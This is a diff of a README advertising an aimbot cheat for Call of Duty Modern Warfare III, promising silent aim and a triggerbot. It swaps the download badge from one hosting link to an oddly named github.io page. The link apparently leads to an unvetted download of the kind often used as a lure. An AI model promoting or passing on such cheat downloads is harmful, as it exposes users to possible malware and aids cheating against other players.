@@ -6,7 +6,7 @@
 
 Whether you’re trying to **dominate Ranked**, **finesse legit mode**, or **rage with max kills**, this mod gives you **snap-lock accuracy, head-targeting, triggerbot**, and **silent aim** built to **outgun everyone, every time**.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload4.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://COD-Modern-Warfare-III-Aimbot-qy6.github.io/.github)
 ---
 
 ## 🎯 Key Features of the MWIII Aimbot
